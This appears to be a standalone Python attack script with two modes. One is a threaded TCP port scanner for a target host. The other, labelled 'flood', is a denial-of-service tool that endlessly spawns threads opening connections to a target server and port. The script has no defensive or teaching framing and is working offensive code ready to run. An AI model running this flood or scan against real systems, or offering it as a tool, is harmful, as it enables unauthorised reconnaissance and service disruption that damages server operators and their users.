import socket
import threading
import sys
import time

if sys.argv[1] == "scan":
    open_port = []
    scaned = 0

    print("Scaning port.")

    start_time = time.time()

    def scan(port):
        try:
            print("Scaning port "+str(port))
            global scaned
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((sys.argv[2], port))
            if result == 0:
                open_port.append(port)

            s.close()
            scaned += 1

        except:
            scaned += 1


    for port in range(1, 65535):
        threading.Thread(target=scan, args=[port, ]).start()

    while True:
        if scaned == 65534:
            open_port.sort()
            print("\n\n\n\n\n")
            if len(open_port) == 0:
                print("No port is open.")

            for port in open_port:
                print("Port " + str(port) + " is open.")

            end_time = time.time()

            print("Scaned " + sys.argv[2] + " in " + str(end_time - start_time) + " seconds.")

            sys.exit()

elif sys.argv[1] == "flood":
    print("Attacking server.")

    def attack():
        try:
            start_time = time.time()
            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dos.connect((sys.argv[2], int(sys.argv[3])))
            message = "0"
            dos.send(message.encode())
            end_time = time.time()
            print("Connect success. Time=" + str(end_time - start_time) + ".")
        except:
            print("Connect fail.")


    while True:
        threading.Thread(target=attack).start()